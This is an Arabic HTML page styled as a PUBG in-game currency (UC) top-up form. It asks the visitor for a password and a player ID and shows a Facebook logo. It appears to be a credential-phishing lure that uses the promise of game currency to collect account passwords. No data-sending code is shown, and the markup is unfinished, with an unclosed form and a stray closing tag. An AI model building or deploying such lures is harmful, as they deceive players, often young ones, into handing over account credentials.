<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شحن شدات ببجي</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a; /* لون خلفية داكن */
            color: #fff; /* لون النص */
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            margin: auto;
            background: #333; /* لون خلفية علبة الشحن */
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            text-align: center; /* إضافة لتوسيع المحتوى */
        }
        input[type="text"], input[type="number"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #555; /* لون حدود المدخلات */
            border-radius: 3px;
            background: #444; /* لون خلفية المدخلات */
            color: #fff; /* لون النص داخل المدخلات */
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #f39c12; /* لون الزر */
            border: none;
            color: #fff;
            border-radius: 3px;
            cursor: pointer;
        }
        button:hover {
            background-color: #e67e22; /* لون الزر عند التمرير */
        }
        .pubg-logo {
            margin-top: 20px; /* مسافة فوق الشعار */
            width: 100px; /* عرض شعار ببجي */
            cursor: pointer; /* جعل الشعار يبدو قابلًا للنقر */
        }
        .facebook-logo {
            margin-top: 20px; /* مسافة فوق الشعار */
            width: 70px; /* عرض شعار فيسبوك أصغر */
        }
    </style>
</head>
<body>

<div class="container">
    <h2>شحن شدات ببجي</h2>
    
    <!-- إضافة شعار ببجي في الأعلى -->

    <form id="form">

        <input type="password" id="password" placeholder="كلمة السر" required>

        <input type="text" id="playerId" placeholder="رقم هوية اللاعب" required>

        <img class="facebook-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="شعار فيسبوك">
    </a>
</div>
